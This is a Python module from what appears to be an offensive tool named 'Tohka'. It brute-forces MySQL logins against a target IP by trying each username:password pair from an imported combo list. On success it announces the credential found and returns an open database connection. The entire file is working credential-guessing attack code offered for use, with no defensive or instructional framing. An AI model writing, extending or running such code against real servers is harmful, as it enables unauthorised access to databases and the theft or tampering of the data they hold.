import pymysql

from Tohka.lib.constants import COMBOS #type: ignore
from Tohka.lib.colors    import Colors #type: ignore
from Tohka.lib.ui        import TOHKA  #type: ignore

def login_sql(ip: str) -> pymysql.connections.Connection | None:
    """Login SQL server via dictionary attack

    Args:
        ip(str): Target IP address.
    
    Returns:
        Mysql driver connection
    """
    print(f'\n{Colors.YELLOW}• {Colors.WHITE}Attempting to login SQL server {Colors.WHITE}({Colors.PURPLE}{ip}{Colors.WHITE})...')
    
    for cred in COMBOS:
        # NOTE: Parse username and password
        username, _, password = cred.strip().partition(':')

        # NOTE: Attempt to login using credentials.
        try:
            conn: pymysql.connections.Connection | None = pymysql.connect(
                host = ip, 
                user = username, 
                password = password, 
                charset = 'utf8mb4',
                connect_timeout = 5, 
                write_timeout = 5, 
                read_timeout = 5
            )
        except:
            continue
        
        # NOTE: Success!
        print(f'{Colors.LIME}• {TOHKA} {Colors.WHITE}has successfully logged in {Colors.WHITE}({Colors.PURPLE}{ip}{Colors.WHITE}) {Colors.WHITE}({Colors.PURPLE}{cred}{Colors.WHITE}).')
        return conn
    
    print(f'\n{Colors.RED}• {Colors.WHITE}Failed to login SQL server {Colors.WHITE}({Colors.PURPLE}{ip}{Colors.WHITE}).')